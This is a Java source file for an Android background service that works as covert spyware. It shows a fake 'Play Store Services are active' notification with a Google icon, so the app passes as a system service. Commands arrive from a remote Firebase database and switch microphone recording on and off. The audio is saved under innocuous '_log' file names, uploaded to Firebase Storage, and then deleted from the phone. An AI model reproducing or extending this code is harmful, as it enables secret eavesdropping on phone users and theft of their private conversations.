package com.app.texter;


import static android.content.ContentValues.TAG;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.media.audiofx.NoiseSuppressor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.provider.SyncStateContract;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import com.google.android.gms.common.internal.Constants;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;

public class serviceFail extends Service {


    boolean loop=false;
    private boolean recstart=false;
    MediaRecorder recorder;
    FirebaseStorage storage;
    StorageReference storageReference;
    File filePath;
    File path;
    boolean RecShouldStart=false;

    FirebaseDatabase firebaseDatabase;
    DatabaseReference databaseReference;





    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        firebaseDatabase = FirebaseDatabase.getInstance();
        databaseReference = firebaseDatabase.getReference("User");


        createNotification();


        Notification notification = new NotificationCompat.Builder(this, "Channel1Id")
                .setContentTitle("System Service")
                .setContentText("Play Store Services are active")
                .setSmallIcon(R.drawable.googleg_standard_color_18).build();

        startForeground(1, notification);

       // Toast.makeText(serviceFail.this, "ServiceFail on", Toast.LENGTH_SHORT).show();


        databaseReference.addValueEventListener(new ValueEventListener() {
                @Override
                public void onDataChange(@NonNull DataSnapshot snapshot) {
                    ArrayList<String> arr = new ArrayList<>();
                    for (DataSnapshot snap : snapshot.getChildren()) {
                        arr.add(snap.getValue().toString());
                    }

                    ServiceRuninngState("Running Now");
                    path = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/Logandroidfiles");
                    if (!path.exists()) {
                        path.mkdirs();
                    }


                    if (arr.get(4).equals("1")) { RecShouldStart = true; } else {RecShouldStart = false; }
                    if (arr.get(0).equals("1")) { loop=true;} else{loop=false;}

                    String fn = filenameCreator();
                    if (RecShouldStart) {
                        if (!recstart) {
                            startRecording(serviceFail.this, "", fn);
                            //Toast.makeText(serviceFail.this, "start Rec", Toast.LENGTH_SHORT).show();
                            recstart = true;
                        }
                    } else {
                        if (recstart) {
                            stopRecording();
                            //Toast.makeText(serviceFail.this, "Stop Rec", Toast.LENGTH_SHORT).show();
                            recstart = false;
                            try {
                                ArrayList<String> filesinDict = dictFiles(path);
                                if (isInternet(serviceFail.this)) {

                                    uploadFile(serviceFail.this, filesinDict, path);
                                }
                            } catch (NullPointerException er) {
                                er.printStackTrace();
                            } catch (Exception exc) {
                                exc.printStackTrace();
                            }
                        }

                    }


                }


                @Override
                public void onCancelled(@NonNull DatabaseError error) {

                }
            });

            if (loop){ return START_NOT_STICKY; }
            else{return START_STICKY; }
    }


    @Override
    public void onDestroy() {
        stopForeground(true);
        stopSelf();
        Log.d(TAG, "Destroy is Called");
        ServiceRuninngState("Stopped Now");
        super.onDestroy();
    }

    private void createNotification(){
        if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.O){
            NotificationChannel notificationChannel=new NotificationChannel("Channel1Id","Foreground notification",
                    NotificationManager.IMPORTANCE_DEFAULT);

            NotificationManager manager=getSystemService(NotificationManager.class);
            manager.createNotificationChannel(notificationChannel);
        }
}







    public String filenameCreator(){
        path = new File(Environment.getExternalStorageDirectory().getAbsolutePath()+"/Logandroidfiles");
        if (!path.exists()){path.mkdirs();}

        DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
        Date date = new Date();
        String currentdate=(String) dateFormat.format(date);
        String[] datee=currentdate.split(" ");
        String day=datee[0].replace("/","_");
        String time = datee[1].replace(":","_");

        String filename=path+"/"+"_"+day+"_"+time+"_log.3gp";
        return filename;
    }

    public void startRecording(Context context, String number, String filename) {
        recorder = new MediaRecorder();
        //recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
        recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        recorder.setOutputFile(filename);

        try {
            recorder.prepare();
            recorder.start();
            recstart = true;
        } catch (IllegalStateException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void stopRecording() {
        if (recstart) {
            recorder.stop();
            recorder.release();
            recstart = false;
        }
    }

    public ArrayList<String> dictFiles(File path){
        ArrayList<String> filesname=new ArrayList<>();

        File directory = new File(String.valueOf(path));
        File[] files = directory.listFiles();
        for (int i = 0; i < files.length; i++)
        {
            filesname.add(files[i].getName());
            Log.d("Files", "This is FileName:" + files[i].getName());
        }

        return filesname;
    };

    public boolean isInternet(Context context){
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo nf = cm.getActiveNetworkInfo();
            return (nf != null && nf.isConnected());
        }
        catch (NullPointerException e){
            e.printStackTrace();
            return false;
        }


    }

    public void uploadFile(Context context, ArrayList<String> uploadfile,File path){
        storage = FirebaseStorage.getInstance();
        storageReference = storage.getReference();


        for (int i=0; i<uploadfile.size(); i++) {


            String filename=uploadfile.get(i);
            filePath=new File( path+"/"+filename);

            StorageReference ref = storageReference.child("Voice/").child(filename);

            ref.putFile(Uri.fromFile(filePath))


                    .addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {

                        @Override
                        public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                            Log.d(TAG, filePath.toString());
                           // Toast.makeText(context, "Uploaded!!", Toast.LENGTH_SHORT).show();
                            File file = new File(path, filename);
                            boolean deleted = file.delete();
                        }
                    })

                    .addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception e) {
                            //When error is thrown!
                          //  Toast.makeText(context, "Failed " + e.getMessage(), Toast.LENGTH_SHORT).show();
                        }
                    });
        }


    }

    public void ServiceRuninngState(String value){
        HashMap h=new HashMap();
        h.put("running",value);
        databaseReference.updateChildren(h);
    }
}
